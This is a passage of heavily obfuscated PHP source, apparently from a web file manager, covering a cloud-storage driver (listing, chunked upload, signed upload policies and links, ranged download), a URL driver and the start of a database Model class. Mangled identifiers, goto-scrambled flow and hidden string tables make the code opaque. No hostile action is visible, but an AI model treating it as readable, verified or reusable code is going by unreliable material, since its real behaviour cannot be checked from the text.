$cÇéø„ŞÌ¼[$f‡‰¾À¯†â[28]], $f‡‰¾À¯†â[8]) . ($C²ÉñÛ‹Ÿ ? $f‡‰¾À¯†â[8] : $f‡‰¾À¯†â[33]); $A£ô…ë´› = array($f‡‰¾À¯†â[28] => $B’ÍÌÅÆÃø, $f‡‰¾À¯†â[29] => $C²ÉñÛ‹Ÿ ? $f‡‰¾À¯†â[77] : $f‡‰¾À¯†â[193], $f‡‰¾À¯†â[78] => $cÇéø„ŞÌ¼[$f‡‰¾À¯†â[335]], $f‡‰¾À¯†â[1333] => $cÇéø„ŞÌ¼[$f‡‰¾À¯†â[1339]]); if ($CçêÜñ‹è) { $this->cacheMethod($f‡‰¾À¯†â[199], $B’ÍÌÅÆÃø, $C²ÉñÛ‹Ÿ); $this->cacheMethod($f‡‰¾À¯†â[200], $B’ÍÌÅÆÃø, $A£ô…ë´›); } if ($C²ÉñÛ‹Ÿ) { $dãàêŠ¿ºœ[] = $B’ÍÌÅÆÃø; if ($D±¹¥î†¿¯) { $this->fileList($B’ÍÌÅÆÃø, $dãàêŠ¿ºœ, $b°î«­™, $D±¹¥î†¿¯); } continue; } $b°î«­™[] = $A£ô…ë´›; } if (count($D¼ã¦‹ô) < $Dñœ‰Èš˜¬) { break; } } goto BºœåÈ£ã; BºœåÈ£ã: if ($CçêÜñ‹è) { $this->cacheMethod($f‡‰¾À¯†â[199], $Bì˜‹Æï, !0); } goto eÖˆÑâŠŒ¾; F°‡¨ù®‰É: $f‡‰¾À¯†â =& $_SERVER[ÒÆ›ÆØÎ¾]; $bÔÚÀÖ²­è = $f‡‰¾À¯†â[33]; $Dñœ‰Èš˜¬ = 1000; goto eäÁºí–‚; eÖˆÑâŠŒ¾: } public function listPath($cíµíê—î, $Då´†é…ö = false) { $ağ·³¼Şª =& $_SERVER[ÒÆ›ÆØÎ¾]; $FªÏôÀ˜ö‘ = $FËš§‚§æÔ = array(); $this->fileList($cíµíê—î, $FªÏôÀ˜ö‘, $FËš§‚§æÔ); foreach ($FªÏôÀ˜ö‘ as $Aå¸œ¹Í‹ => $eéğÃäÅùÃ) { $FªÏôÀ˜ö‘[$Aå¸œ¹Í‹] = $this->folderInfo($eéğÃäÅùÃ, $Då´†é…ö); } foreach ($FËš§‚§æÔ as $Aå¸œ¹Í‹ => $eéğÃäÅùÃ) { $FËš§‚§æÔ[$Aå¸œ¹Í‹] = $this->fileInfo($eéğÃäÅùÃ[$ağ·³¼Şª[28]], $Då´†é…ö, $eéğÃäÅùÃ); } return array($ağ·³¼Şª[75] => $FªÏôÀ˜ö‘, $ağ·³¼Şª[74] => $FËš§‚§æÔ); } public function has($fÑ¨ª¼èŒÀ, $c…ƒã÷‹ø = false, $f¸Ì„š­Áï = true) { goto d‰ÑÑÎ‡±; e‰ç è: while (!0) { check_abort(); $EÒ§Î©Ö³ = $this->listObjs($fÑ¨ª¼èŒÀ, $dÑè½‘Ğ½ª, $Aáº¬£²‰ï); if (!$EÒ§Î©Ö³) { return !1; } $dÑè½‘Ğ½ª = isset($EÒ§Î©Ö³[$e¿’Çê’ç[1337]]) ? $EÒ§Î©Ö³[$e¿’Çê’ç[1337]] : $e¿’Çê’ç[33]; $däàÎ—º´— = isset($EÒ§Î©Ö³[$e¿’Çê’ç[1338]]) ? $EÒ§Î©Ö³[$e¿’Çê’ç[1338]] : array(); if (empty($däàÎ—º´—)) { break; } $FÖÑ—ÔÈ®• = array_filter($däàÎ—º´—, function ($E‰šƒ¦’³£) { $BÌ÷È„ä³ =& $_SERVER[ÒÆ›ÆØÎ¾]; return $E‰šƒ¦’³£[$BÌ÷È„ä³[29]] == $BÌ÷È„ä³[77]; }); $bßÆŒÜôô = count($däàÎ—º´—); $FÖÑ—ÔÈ®• = count($FÖÑ—ÔÈ®•); $a¡‹áÄ×Ò˜ = $bßÆŒÜôô - $FÖÑ—ÔÈ®•; if ($c…ƒã÷‹ø) { $FéŞùÌØÀî += $FÖÑ—ÔÈ®•; $D‘ô¢¢Ë× += $a¡‹áÄ×Ò˜; if ($bßÆŒÜôô < $Aáº¬£²‰ï) { break; } continue; } if ($f¸Ì„š­Áï) { if ($a¡‹áÄ×Ò˜) { return !0; } } else { if ($FÖÑ—ÔÈ®•) { return !0; } } if ($bßÆŒÜôô < $Aáº¬£²‰ï) { break; } } if ($c…ƒã÷‹ø) { return array($e¿’Çê’ç[203] => $D‘ô¢¢Ë×, $e¿’Çê’ç[204] => $FéŞùÌØÀî); } return !1; goto CÊÅ–ÙÂ¸Ú; D‚±¦÷¥†×: $D‘ô¢¢Ë× = 0; $FéŞùÌØÀî = 0; $F±Ó×½«†Ê = rtrim($fÑ¨ª¼èŒÀ, $e¿’Çê’ç[8]) . $e¿’Çê’ç[8]; goto e‰ç è; d‰ÑÑÎ‡±: $e¿’Çê’ç =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÑè½‘Ğ½ª = $e¿’Çê’ç[33]; $Aáº¬£²‰ï = 500; goto D‚±¦÷¥†×; CÊÅ–ÙÂ¸Ú: } public function listAll($CˆÒÀ‚­¬Ì) { goto f‰Ôç êºº; D·‰éÛ¬Øà: return $this->listAllFiles($CˆÒÀ‚­¬Ì, array_keys($céŞì–­Ñ¾), $céŞì–­Ñ¾); goto Bì °§Òó²; f‰Ôç êºº: $Aæ°•¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cÉÁöÁÄÍ = $Cò»ï¿µ = array(); $this->fileList($CˆÒÀ‚­¬Ì, $cÉÁöÁÄÍ, $Cò»ï¿µ, !0); goto bˆÎø–ãçí; bˆÎø–ãçí: $céŞì–­Ñ¾ = array(); foreach ($Cò»ï¿µ as $b¥‡Ê¬˜¢) { $céŞì–­Ñ¾[$b¥‡Ê¬˜¢[$Aæ°•¶[28]]] = $b¥‡Ê¬˜¢[$Aæ°•¶[78]]; } foreach ($cÉÁöÁÄÍ as $b¥‡Ê¬˜¢) { if (is_string($b¥‡Ê¬˜¢)) { $céŞì–­Ñ¾[$b¥‡Ê¬˜¢] = 0; } } goto D·‰éÛ¬Øà; Bì °§Òó²: } public function canRead($C†ì–°ãâ) { return $this->exist($C†ì–°ãâ) ? !0 : !1; } public function canWrite($B•À„ù´¦) { return $this->exist($B•À„ù´¦) ? !0 : !1; } public function getContent($DŞ–ÔŞëèÑ) { return $this->fileSubstr($DŞ–ÔŞëèÑ, 0, -1); } public function setContent($E¾Ù›ÏÓ¤«, $B›çöñö = '') { $AÖ“Ç«ÅäÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$B›çöñö) { $bÑ¿¯×…¨ = $this->ussRequest($E¾Ù›ÏÓ¤«, $AÖ“Ç«ÅäÒ[224]); return $bÑ¿¯×…¨[$AÖ“Ç«ÅäÒ[1077]]; } $FÕŸô®ã¥Œ = $this->tempFile($this->pathThis($E¾Ù›ÏÓ¤«)); file_put_contents($FÕŸô®ã¥Œ, $B›çöñö); if ($this->upload($E¾Ù›ÏÓ¤«, $FÕŸô®ã¥Œ)) { $this->tempFileRemve($FÕŸô®ã¥Œ); return !0; } return !1; } public function fileSubstr($e«‰ƒ¸›ø, $Eñî‹”“¨Ó, $E–Ö¶‡²¼) { $E¸Áäí«± =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!($Bµ¬°¯Ë“ = $this->link($e«‰ƒ¸›ø))) { return !1; } $f—à´Ğ«ãË = !1; if ($E–Ö¶‡²¼ > 0) { $dª¬ŒÆ„ = $Eñî‹”“¨Ó + $E–Ö¶‡²¼ - 1; $f—à´Ğ«ãË = array($E¸Áäí«±[1300] . $Eñî‹”“¨Ó . $E¸Áäí«±[440] . $dª¬ŒÆ„); } $f°Ï©ÅäÆê = url_request($Bµ¬°¯Ë“, $E¸Áäí«±[228], !1, $f—à´Ğ«ãË); return $f°Ï©ÅäÆê[$E¸Áäí«±[702]] ? $f°Ï©ÅäÆê[$E¸Áäí«±[1079]] : !1; } public function upload($Aóöˆø˜—, $c†æ§íåˆî, $A–ê…ø÷‡× = false, $dÔŞããÀßÊ = REPEAT_REPLACE) { goto a•Ò°Öæ; C»Æ½éã÷Ä: $A÷ˆØ¬¼Ç = 1024 * 1024 * 10; $cŸÄ¢Áë‹ = array($B½‚¸¥Û«—[1341], $B½‚¸¥Û«—[1342] . $aàØ‹¶÷§‰, $B½‚¸¥Û«—[1343], $B½‚¸¥Û«—[1344] . $A÷ˆØ¬¼Ç); $eÔ†õò‡˜† = $this->ussRequest($Aóöˆø˜—, $B½‚¸¥Û«—[226], !1, $cŸÄ¢Áë‹); goto e­¾‘´àõ; CíØÈ†»òË: $Eò¿òØ¤ì = $bŸõßÇ°¬ã[$B½‚¸¥Û«—[1345]]; $f´ïº„Ìå‘ = fopen($c†æ§íåˆî, $B½‚¸¥Û«—[1250]); if (!$f´ïº„Ìå‘) { return !1; } goto D—‘ÓìÙ›Ò; a•Ò°Öæ: $B½‚¸¥Û«— =& $_SERVER[ÒÆ›ÆØÎ¾]; $aàØ‹¶÷§‰ = IO::size($c†æ§íåˆî); if ($aàØ‹¶÷§‰ <= 1024 * 1024 * 200) { $D¼ñ¸š±¼‡ = array($B½‚¸¥Û«—[1340] . $c†æ§íåˆî); $eÔ†õò‡˜† = $this->ussRequest($Aóöˆø˜—, $B½‚¸¥Û«—[226], $D¼ñ¸š±¼‡); return $eÔ†õò‡˜†[$B½‚¸¥Û«—[1077]] ? $this->getPathOuter($Aóöˆø˜—) : !1; } goto C»Æ½éã÷Ä; e­¾‘´àõ: if (!$eÔ†õò‡˜†[$B½‚¸¥Û«—[1077]]) { return !1; } $bŸõßÇ°¬ã = $eÔ†õò‡˜†[$B½‚¸¥Û«—[1079]]; $bİ¡–§• = 0; goto CíØÈ†»òË; D—‘ÓìÙ›Ò: do { $E¾ÅÓ» † = $bŸõßÇ°¬ã[$B½‚¸¥Û«—[1346]]; fseek_64($f´ïº„Ìå‘, $bİ¡–§•); $f‡ŠÆ©„Å = fread($f´ïº„Ìå‘, $E¾ÅÓ» †); $FÊ˜‰×İ´· = 0; do { $FÊ˜‰×İ´·++; $bŸõßÇ°¬ã = $this->uploadPart($Aóöˆø˜—, $bŸõßÇ°¬ã, $f‡ŠÆ©„Å); } while (!$bŸõßÇ°¬ã && $FÊ˜‰×İ´· < 3); if (!$bŸõßÇ°¬ã) { return !1; } $Eò¿òØ¤ì = $bŸõßÇ°¬ã[$B½‚¸¥Û«—[1345]]; $bİ¡–§• += $E¾ÅÓ» †; } while ($Eò¿òØ¤ì != -1); fclose($f´ïº„Ìå‘); $cŸÄ¢Áë‹ = array($B½‚¸¥Û«—[1347], $B½‚¸¥Û«—[1348] . $bŸõßÇ°¬ã[$B½‚¸¥Û«—[1349]], $B½‚¸¥Û«—[1343]); goto F”ĞÎ„Ã; F”ĞÎ„Ã: $eÔ†õò‡˜† = $this->ussRequest($Aóöˆø˜—, $B½‚¸¥Û«—[226], !1, $cŸÄ¢Áë‹); return $eÔ†õò‡˜†[$B½‚¸¥Û«—[1077]] ? $this->getPathOuter($A„–¨˜Ü§¨) : !1; goto B†šŒê¯¯‚; B†šŒê¯¯‚: } private function uploadPart($Eøö°‹Ü°ò, $D™…¼‹ñéÓ, &$B¤ˆÖÁß™) { $Bé«àğ¶íÌ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Fö¯İÍä¾¨ = array($Bé«àğ¶íÌ[1350], $Bé«àğ¶íÌ[1348] . $D™…¼‹ñéÓ[$Bé«àğ¶íÌ[1349]], $Bé«àğ¶íÌ[1351] . $D™…¼‹ñéÓ[$Bé«àğ¶íÌ[1345]], $Bé«àğ¶íÌ[141] . $D™…¼‹ñéÓ[$Bé«àğ¶íÌ[1346]]); $c§ª­›È = $this->ussRequest($Eøö°‹Ü°ò, $Bé«àğ¶íÌ[226], $B¤ˆÖÁß™, $Fö¯İÍä¾¨); return !$c§ª­›È[$Bé«àğ¶íÌ[1077]] ? $c§ª­›È[$Bé«àğ¶íÌ[1077]] : $c§ª­›È[$Bé«àğ¶íÌ[1079]]; } public function uploadFormData($CÕ”ÜÃó–É, $A½í®¡° ô = 3600) { return $this->uploadPolicy($CÕ”ÜÃó–É, $A½í®¡° ô); } public function multiUploadFormData($b°ò¸¦ÀĞ, $FÇÄŒÚ¶ï = 3600) { $B°­–Œ›˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bëˆ¶½ùñ™ = (int) $GLOBALS[$B°­–Œ›˜[7]][$B°­–Œ›˜[78]]; return $this->uploadPolicy($b°ò¸¦ÀĞ, $FÇÄŒÚ¶ï, $bëˆ¶½ùñ™); } private function uploadPolicy($eÑ˜ÈÛ, $Añ‚¸£ŒÊ† = 3600, $b•¹ª½™á = 0) { goto F˜«‚ Ããà; F˜«‚ Ããà: $cÜŠ‰ÒœÑî =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÎÇèôÙÉŸ = $cÜŠ‰ÒœÑî[8] . $this->bucket; $A‘¨ÇÏ®øÑ = gmdate($cÜŠ‰ÒœÑî[1287]); goto D²ŸåÈÁ›÷; F§¿¦”¢„: $Cä‹³¶Åò  = base64_encode(hash_hmac($cÜŠ‰ÒœÑî[1322], "\x50\x4f\123\124\x26{$aÎÇèôÙÉŸ}\46{$A‘¨ÇÏ®øÑ}\46{$A’£Ùàïïù}", md5("{$this->userpass}"), !0)); $b½±®¢ÆÛÍ = array($cÜŠ‰ÒœÑî[1192] => $A’£Ùàïïù, $cÜŠ‰ÒœÑî[1356] => "\x55\x50\131\x55\x4e\x20{$this->username}\72{$Cä‹³¶Åò }", $cÜŠ‰ÒœÑî[175] => $this->endpoint . $aÎÇèôÙÉŸ); return $b½±®¢ÆÛÍ; goto Bë¹ê÷Ğ…; D²ŸåÈÁ›÷: $cÅÕ¡¸Ö = array($cÜŠ‰ÒœÑî[1352] => $this->bucket, $cÜŠ‰ÒœÑî[1353] => $eÑ˜ÈÛ, $cÜŠ‰ÒœÑî[1354] => time() + $Añ‚¸£ŒÊ†, $cÜŠ‰ÒœÑî[1355] => $A‘¨ÇÏ®øÑ); if ($b•¹ª½™á) { $cÅÕ¡¸Ö[$cÜŠ‰ÒœÑî[1266]] = $b•¹ª½™á; } $A’£Ùàïïù = base64_encode(json_encode($cÅÕ¡¸Ö)); goto F§¿¦”¢„; Bë¹ê÷Ğ…: } public function download($CÄÕÉå‚¶, $b¥†¹±ßì”) { goto fÚ…ˆ°ÂÚÍ; fÚ…ˆ°ÂÚÍ: $Fª±Ú³† = IO::getPathInner(IO::mkfile($b¥†¹±ßì”)); if (!($aÈËÌÇÈĞ¦ = $this->link($CÄÕÉå‚¶))) { return !1; } $D¤ŒŠ„Âé‚ = 0; goto EŒ©«¥–Ó; FÒãÃŠ‡ÁÖ: fclose($A‘•ˆãâğÛ); return $b¥†¹±ßì”; goto CÏ¾¤àÕŞÔ; EŒ©«¥–Ó: $b‰²±ùĞ‰ = 1024 * 200; $A‘•ˆãâğÛ = fopen($Fª±Ú³†, $_SERVER[ÒÆ›ÆØÎ¾][1306]); while (!0) { $EÁ¯ó«ƒ¬È = $this->fileSubstr($CÄÕÉå‚¶, $D¤ŒŠ„Âé‚, $b‰²±ùĞ‰); if ($EÁ¯ó«ƒ¬È === !1) { return !1; } fwrite($A‘•ˆãâğÛ, $EÁ¯ó«ƒ¬È); $D¤ŒŠ„Âé‚ += $b‰²±ùĞ‰; if (strlen($EÁ¯ó«ƒ¬È) < $b‰²±ùĞ‰) { break; } } goto FÒãÃŠ‡ÁÖ; CÏ¾¤àÕŞÔ: } public function link($B»›ìøŒ¸—, $A„Â’”°‹Û = array()) { $e›œê¸„Ú™ =& $_SERVER[ÒÆ›ÆØÎ¾]; $B»›ìøŒ¸— = trim($B»›ìøŒ¸—, $e›œê¸„Ú™[8]); if (!empty($this->token)) { $a”±êÏõ¹ì = strtotime(date($e›œê¸„Ú™[1357])); $f´å²í·´Í = substr(md5($this->token . $e›œê¸„Ú™[282] . $a”±êÏõ¹ì . $e›œê¸„Ú™[1358] . $B»›ìøŒ¸—), 12, 8) . $a”±êÏõ¹ì; $A„Â’”°‹Û[] = $e›œê¸„Ú™[1359] . $f´å²í·´Í; } $f‡á™¦ˆ„‚ = !empty($A„Â’”°‹Û) ? $e›œê¸„Ú™[70] . implode($e›œê¸„Ú™[282], $A„Â’”°‹Û) : $e›œê¸„Ú™[33]; return $this->getHost() . $e›œê¸„Ú™[8] . $B»›ìøŒ¸— . $f‡á™¦ˆ„‚; } public function fileOut($DÃÌí²ø§ó, $d¾èí„ Ì = false, $C–³»§‡‚Ú = false, $DäÔÛ›ÜøØ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($DÃÌí²ø§ó, $d¾èí„ Ì, $C–³»§‡‚Ú, $DäÔÛ›ÜøØ); } if (!$C–³»§‡‚Ú) { $C–³»§‡‚Ú = $this->pathThis($DÃÌí²ø§ó); } $e¨å‹ÖÜ = $d¾èí„ Ì ? array($_SERVER[ÒÆ›ÆØÎ¾][1360] . rawurlencode($C–³»§‡‚Ú)) : array(); $fÂœ¼‹° = $this->link($DÃÌí²ø§ó, $e¨å‹ÖÜ); $this->fileOutLink($fÂœ¼‹°); } public function fileOutServer($Bà‹¿¹ƒ, $EµğÂÄÚ¶× = false, $eä¿„àµÌö = false, $bòÈç°¥™Õ = '') { parent::fileOut($Bà‹¿¹ƒ, $EµğÂÄÚ¶×, $eä¿„àµÌö, $bòÈç°¥™Õ); } public function fileOutImage($FÌŞË»È©”, $a­½’ê‰ßÏ = 250) { $B“é ›Î¸• = $this->link($FÌŞË»È©” . $_SERVER[ÒÆ›ÆØÎ¾][1361] . $a­½’ê‰ßÏ); $this->fileOutLink($B“é ›Î¸•); } public function fileOutImageServer($F¿Íã˜çÔ‚, $d¶áƒÃ£œ = 250) { parent::fileOutImage($F¿Íã˜çÔ‚, $d¶áƒÃ£œ); } public function hashMd5($dšìä·„¼š) { $f°…ñçÌò» =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÕëìÄÆ = $this->_objectMeta($dšìä·„¼š); return isset($EÕëìÄÆ[$f°…ñçÌò»[208]]) ? $EÕëìÄÆ[$f°…ñçÌò»[208]] : !1; } public function size($c¡¾ÙÒ¼Åö) { $Eë‹ÚÎ‰õˆ = $this->objectMeta($c¡¾ÙÒ¼Åö); return $Eë‹ÚÎ‰õˆ ? $Eë‹ÚÎ‰õˆ[$_SERVER[ÒÆ›ÆØÎ¾][78]] : 0; } public function info($B¥ÌéŸçÕÔ) { if ($this->isFolder($B¥ÌéŸçÕÔ)) { return $this->folderInfo($B¥ÌéŸçÕÔ); } else { if ($this->isFile($B¥ÌéŸçÕÔ)) { return $this->fileInfo($B¥ÌéŸçÕÔ); } } return !1; } public function exist($D°àÃ¡ëµ) { return $this->isFile($D°àÃ¡ëµ) || $this->isFolder($D°àÃ¡ëµ); } public function isFile($BÎÄæ…Ü¾¥) { return !$this->isFolder($BÎÄæ…Ü¾¥) && $this->objectMeta($BÎÄæ…Ü¾¥); } public function isFolder($b’ÂĞÄ›ßÉ) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][199], $b’ÂĞÄ›ßÉ); } protected function objectMeta($fë†İ‡Ô½÷) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][200], $fë†İ‡Ô½÷); } protected function _objectMeta($Bé£ìõ·‚Î) { goto dŠŠÂ„¾Óí; dŠŠÂ„¾Óí: $d­· õŠİì =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($Bé£ìõ·‚Î == $d­· õŠİì[33] || $Bé£ìõ·‚Î == $d­· õŠİì[8]) { return array(); } $dàÌœ±…„ = $this->ussRequest($Bé£ìõ·‚Î, $d­· õŠİì[1362]); goto Fãìù¼›“Á; BÊ—Ñ¤©»ª: $Eİ•ºëë½‡ = array($d­· õŠİì[29] => isset($EÁ“ªÔì¦§[$d­· õŠİì[1363]]) ? $EÁ“ªÔì¦§[$d­· õŠİì[1363]] : null, $d­· õŠİì[78] => isset($EÁ“ªÔì¦§[$d­· õŠİì[1364]]) ? $EÁ“ªÔì¦§[$d­· õŠİì[1364]] : null, $d­· õŠİì[208] => isset($EÁ“ªÔì¦§[$d­· õŠİì[1365]]) ? $EÁ“ªÔì¦§[$d­· õŠİì[1365]] : null, $d­· õŠİì[1332] => isset($EÁ“ªÔì¦§[$d­· õŠİì[1366]]) ? $EÁ“ªÔì¦§[$d­· õŠİì[1366]] : null); $Eİ•ºëë½‡[$d­· õŠİì[1333]] = isset($EÁ“ªÔì¦§[$d­· õŠİì[1367]]) ? strtotime($EÁ“ªÔì¦§[$d­· õŠİì[1367]]) : $Eİ•ºëë½‡[$d­· õŠİì[1332]]; return $Eİ•ºëë½‡; goto E†ñÉØì ‘; Fãìù¼›“Á: if (!$dàÌœ±…„[$d­· õŠİì[1077]]) { return null; } $EÁ“ªÔì¦§ = isset($dàÌœ±…„[$d­· õŠİì[1079]]) ? $dàÌœ±…„[$d­· õŠİì[1079]] : array(); if (!isset($EÁ“ªÔì¦§[$d­· õŠİì[1363]])) { return null; } goto BÊ—Ñ¤©»ª; E†ñÉØì ‘: } protected function _isFolder($b’Ì…³ƒ‰¶) { $dî˜äÊ÷‚· =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($b’Ì…³ƒ‰¶ == $dî˜äÊ÷‚·[33] || $b’Ì…³ƒ‰¶ == $dî˜äÊ÷‚·[8]) { return !0; } $AÇ²¡¾˜°À = $this->_objectMeta($b’Ì…³ƒ‰¶); return isset($AÇ²¡¾˜°À[$dî˜äÊ÷‚·[29]]) && $AÇ²¡¾˜°À[$dî˜äÊ÷‚·[29]] == $dî˜äÊ÷‚·[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($b¤™ÕÏ•Œ = false) { } public function exist($D‘æ¾ÂŒ…†) { $aãƒè¤Æ”ê = $this->info($D‘æ¾ÂŒ…†); return $aãƒè¤Æ”ê[$_SERVER[ÒÆ›ÆØÎ¾][195]]; } public function isFile($BŸ–ÏÈ«) { $A÷ùèŠ¨‹ = $this->info($BŸ–ÏÈ«); return $A÷ùèŠ¨‹[$_SERVER[ÒÆ›ÆØÎ¾][195]]; } public function isFolder($CŸ¦¡æÍæ) { return !1; } public function size($c¡¹œ¬‚ÉÈ) { $d÷šÎ‰é”÷ = $this->info($c¡¹œ¬‚ÉÈ); return $d÷šÎ‰é”÷[$_SERVER[ÒÆ›ÆØÎ¾][78]]; } public function info($còºâİ‡Â) { return $this->infoParse($còºâİ‡Â); } public function infoAuth($bƒÀë–É‹) { return $this->infoParse($bƒÀë–É‹); } public function infoWithChildren($aïìí¾ô±Õ) { return $this->infoParse($aïìí¾ô±Õ); } public function infoFull($aã‘Ê—›Â) { return $this->infoParse($aã‘Ê—›Â); } private function infoParse($f¨º²¸â•) { $A ’—‚©Øˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fˆÎœœ±—ñ = $this->header($f¨º²¸â•); if (!$fˆÎœœ±—ñ || !$fˆÎœœ±—ñ[$A ’—‚©Øˆ[702]]) { return !1; } $f­¬õê¢Ù = _get($fˆÎœœ±—ñ, $A ’—‚©Øˆ[335], 0); $EÄï²†ĞÕ = array($A ’—‚©Øˆ[28] => $fˆÎœœ±—ñ[$A ’—‚©Øˆ[28]], $A ’—‚©Øˆ[76] => $f¨º²¸â•, $A ’—‚©Øˆ[29] => $A ’—‚©Øˆ[193], $A ’—‚©Øˆ[78] => intval($f­¬õê¢Ù), $A ’—‚©Øˆ[168] => get_path_ext($fˆÎœœ±—ñ[$A ’—‚©Øˆ[28]]), $A ’—‚©Øˆ[1247] => $f­¬õê¢Ù > 0 && $fˆÎœœ±—ñ[$A ’—‚©Øˆ[1368]], $A ’—‚©Øˆ[1248] => !1); return $EÄï²†ĞÕ; } private function header($b¸‚œñÆŒ×) { goto a£Ø…ß; aÀéè¤ÊŞˆ: return self::$_cacheHeader[$b¸‚œñÆŒ×]; goto A¹‘‰…¹’Ÿ; dë½¦Æç³: $GLOBALS[$c¬ˆµÔç¥™[1369]] = !0; self::$_cacheHeader[$b¸‚œñÆŒ×] = url_header($b¸‚œñÆŒ×); $GLOBALS[$c¬ˆµÔç¥™[1369]] = $CÊ¬øùˆÍ; goto aÀéè¤ÊŞˆ; a£Ø…ß: $c¬ˆµÔç¥™ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset(self::$_cacheHeader[$b¸‚œñÆŒ×])) { return self::$_cacheHeader[$b¸‚œñÆŒ×]; } $CÊ¬øùˆÍ = isset($GLOBALS[$c¬ˆµÔç¥™[1369]]) ? $GLOBALS[$c¬ˆµÔç¥™[1369]] : !1; goto dë½¦Æç³; A¹‘‰…¹’Ÿ: } public function hashSimple($Aìéó¤, $aÉ¥…à°‹˜ = false) { goto CÜ¡¬¥¢…; bÖ±¦¸Àäá: $e³‰¾Ó‡Ìº = timeFloat(); $EÄ›É«Ÿ· = 15; for ($díŒİøô‡° = 0; $díŒİøô‡° < $cÌÂºŞ¨Ë; $díŒİøô‡°++) { if (timeFloat() - $e³‰¾Ó‡Ìº > $EÄ›É«Ÿ·) { return !1; } $f±‚İò‚º = $this->fileSubstr($Aìéó¤, $dÛñ‚´½Åô * $díŒİøô‡°, $A‘—ƒÍ¬µ); if (!$f±‚İò‚º) { return !1; } $b³‚…¸©°Ë .= $f±‚İò‚º; } goto A¶×š‚ùõÊ; CÜ¡¬¥¢…: $d‚äíŞ¬øŠ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FšˆŸù©ã = $this->info($Aìéó¤); if (!$FšˆŸù©ã || !$FšˆŸù©ã[$d‚äíŞ¬øŠ[195]]) { return !1; } goto dâÄ¸éÕ¼—; d„°´óÇó—: if ($D³„™İÂêã <= $A‘—ƒÍ¬µ * $cÌÂºŞ¨Ë) { return md5($this->fileSubstr($Aìéó¤, 0, $D³„™İÂêã)) . $D³„™İÂêã; } $dÛñ‚´½Åô = intval($D³„™İÂêã / $cÌÂºŞ¨Ë); $b³‚…¸©°Ë = $d‚äíŞ¬øŠ[33]; goto bÖ±¦¸Àäá; dâÄ¸éÕ¼—: $D³„™İÂêã = $FšˆŸù©ã[$d‚äíŞ¬øŠ[78]]; $A‘—ƒÍ¬µ = 200; $cÌÂºŞ¨Ë = 50; goto d„°´óÇó—; A¶×š‚ùõÊ: $b³‚…¸©°Ë .= $this->fileSubstr($Aìéó¤, $D³„™İÂêã - $A‘—ƒÍ¬µ, $A‘—ƒÍ¬µ); return md5($b³‚…¸©°Ë) . $D³„™İÂêã; goto eíõøƒµ¡å; eíõøƒµ¡å: } public function getContent($f•¯¯Šèä) { return $this->fileSubstr($f•¯¯Šèä); } public function fileSubstr($B°¤ñÙ®, $e°ÕêÏ‹œŠ = 0, $C¨æ—™ÎŠ– = -1) { goto D”¥ó­„×‘; aÙï¾˜ÜÔ‚: if ($C¨æ—™ÎŠ– === -1) { $C¨æ—™ÎŠ– = $F–´…­Ù…[$c êÉÉ®ä[78]]; } if ($C¨æ—™ÎŠ– == 0) { return $c êÉÉ®ä[33]; } $Fß¡Ùëª† = array($c êÉÉ®ä[1370] . $e°ÕêÏ‹œŠ . $c êÉÉ®ä[736] . ($e°ÕêÏ‹œŠ + $C¨æ—™ÎŠ– - 1)); goto Bê÷Œ„ÀÛ; Bê÷Œ„ÀÛ: $fƒó¬”—¤Ã = url_request($B°¤ñÙ®, $c êÉÉ®ä[228], !1, $Fß¡Ùëª†, !1, !1, 1); return $fƒó¬”—¤Ã[$c êÉÉ®ä[1079]] ? $fƒó¬”—¤Ã[$c êÉÉ®ä[1079]] : $c êÉÉ®ä[33]; goto f•Ó°Æ§Íˆ; D”¥ó­„×‘: $c êÉÉ®ä =& $_SERVER[ÒÆ›ÆØÎ¾]; $F–´…­Ù… = $this->info($B°¤ñÙ®); if (!$F–´…­Ù… || !$F–´…­Ù…[$c êÉÉ®ä[195]] && $F–´…­Ù…[$c êÉÉ®ä[78]] > 1024 * 1024 * 10) { return !1; } goto aÙï¾˜ÜÔ‚; f•Ó°Æ§Íˆ: } public function download($B›Š¨‚½”ë, $FÌÀ©âõ‚œ) { Downloader::start($B›Š¨‚½”ë, $FÌÀ©âõ‚œ); return $FÌÀ©âõ‚œ; } } goto FøÒ½š‰Ï¦; E»ì‚Í™àÏ: define($_SERVER[ÒÆ›ÆØÎ¾][240], 0); define($_SERVER[ÒÆ›ÆØÎ¾][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\157\162\x64\145\x72", "\141\x6c\151\141\x73", "\150\141\166\x69\x6e\147", "\147\x72\x6f\165\x70", "\x6c\157\x63\153", "\x64\x69\163\x74\x69\156\143\x74", "\x61\165\164\157", "\146\151\x6c\164\x65\x72", "\x76\141\x6c\x69\144\141\164\x65", "\x72\x65\x73\165\x6c\x74", "\x62\151\x6e\144", "\x74\157\x6b\x65\156"); public function __construct($fàÜÊ§¬²© = '', $Aø¯³ê¹®ç = '', $E×‰Û‘†½ = '') { $B‚‚å–êíÑ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->_initialize(); if (!empty($fàÜÊ§¬²©)) { if (strpos($fàÜÊ§¬²©, $B‚‚å–êíÑ[95])) { list($this->dbName, $this->name) = explode($B‚‚å–êíÑ[95], $fàÜÊ§¬²©); } else { $this->name = $fàÜÊ§¬²©; } } elseif (empty($this->name)) { 